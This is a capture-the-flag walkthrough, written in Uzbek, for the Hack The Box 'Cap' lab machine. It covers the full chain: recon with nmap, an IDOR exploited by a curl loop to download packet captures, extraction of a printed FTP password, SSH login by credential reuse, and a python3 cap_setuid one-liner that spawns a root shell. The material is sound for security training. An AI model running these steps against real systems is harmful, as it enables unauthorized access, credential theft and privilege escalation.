# Cap (HTB, Easy, Linux) — TO'LIQ YECHIM

Target (hozirgi instansiya): **10.129.131.143** ("US Machines 3")
Maqsadlar: `/home/nathan/user.txt` (user) va `/root/root.txt` (root)

## Manbalar (ochiq writeup'lar)
- github.com/k0rrib4n/HTB-Writeups → `Cap/Cap.md`
- github.com/mattiapertusati/htb-cap → `README.md`
- github.com/The-Viper-One/Pentest-Everything → `writeups/hackthebox/linux/cap.md`
- github.com/ice1187/HackTheBox-writeups → `cap/readme.md`
- github.com/exodialabsxyz/exodus → `writeups/hackthebox_machines/Cap/README.md`
- Yana: Kyuu-Ji/htb-write-up, evyatar9/Writeups, luisrodrigues154/Cyber-Security,
  D1se0/h4cker_b00k, reimo22/htb-writeups, jeramiejoyner/HTB-IDOR-Linux-Capabilities

## Zanjir
IDOR (`/data/<id>`) → PCAP → FTP creds → SSH (credential reuse) → `cap_setuid` python3.8 → root

## 1. Recon
```bash
sudo nmap -sC -sV -p- -T4 --min-rate 2000 -oA nmap 10.129.131.143
# 21/tcp  open  ftp    vsftpd 3.0.3
# 22/tcp  open  ssh    OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
# 80/tcp  open  http   gunicorn   -> http-title: "Security Dashboard"
```
Anonim FTP yo'q. Asosiy nishon — 80-portdagi web.

## 2. Web sahifalar
- `/ip`      — ifconfig chiqishi
- `/netstat` — aktiv ulanishlar
- `/capture` — yangi capture boshlaydi va `/data/<id>` ga redirect qiladi

## 3. IDOR (asosiy zaiflik, CWE-639)
`/data/[id]` da avtorizatsiya tekshiruvi yo'q. O'z capture'i `/data/2` (0 paket),
lekin `/data/0` → **boshqa foydalanuvchining** capture'i (72 paket).

```bash
cd ~/htb/cap
for i in 0 1 2 3; do
  curl -s -o "cap_$i.pcap" -w "id=$i -> %{http_code} size=%{size_download}\n" \
    "http://10.129.131.143/data/$i"
done
```

## 4. PCAP'dan FTP credential
```bash
tshark -r cap_0.pcap -Y ftp -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null | head
# yoki
strings cap_0.pcap | grep -iE 'USER|PASS'
```
Natija:
```
USER nathan
PASS Buck3tH4TF0RM3!
```

## 5. Foothold (nathan)
```bash
ftp 10.129.131.143        # nathan / Buck3tH4TF0RM3!
# ftp> get user.txt ; bye
cat user.txt              # USER FLAG

ssh nathan@10.129.131.143 # xuddi shu parol (credential reuse)
cat ~/user.txt            # USER FLAG
```

## 6. Root — Linux capabilities (`cap_setuid`)
```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
# /usr/bin/ping = cap_net_raw+ep

python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# yoki: python3 -c 'import os,pty; os.setuid(0); pty.spawn("/bin/bash")'

whoami                    # root
cat /root/root.txt        # ROOT FLAG
```
GTFOBins: https://gtfobins.github.io/gtfobins/python/#capabilities

## ⚠️ Muhim
Writeup'larda ko'rsatilgan flag'lar **har xil** (masalan `005fa3afb3c8b5a5e84c9fc40b8372bd`
va `b851214819e12d750b97790f62a8a29e`) — HTB flag'larni almashtirgan.
Shuning uchun flag'ni **o'zingizning instansiyadan o'qish shart**, ko'chirish ishlamaydi.
